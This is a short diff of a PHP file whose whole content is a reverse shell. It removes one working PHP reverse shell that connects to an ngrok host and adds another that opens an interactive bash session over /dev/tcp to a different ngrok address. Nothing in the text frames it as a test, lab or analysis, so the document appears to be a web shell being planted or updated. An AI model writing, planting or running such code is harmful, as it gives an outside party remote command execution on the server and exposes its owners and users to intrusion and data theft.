@@ -1,5 +1,3 @@
 <?php
-
-$sock=fsockopen("2.tcp.eu.ngrok.io",17658);exec("/bin/sh -i <&3 >&3 2>&3");
-
-?> 
+exec("/bin/bash -c 'bash -i > /dev/tcp/7.tcp.eu.ngrok.io/14345 0>&1'");
+?>
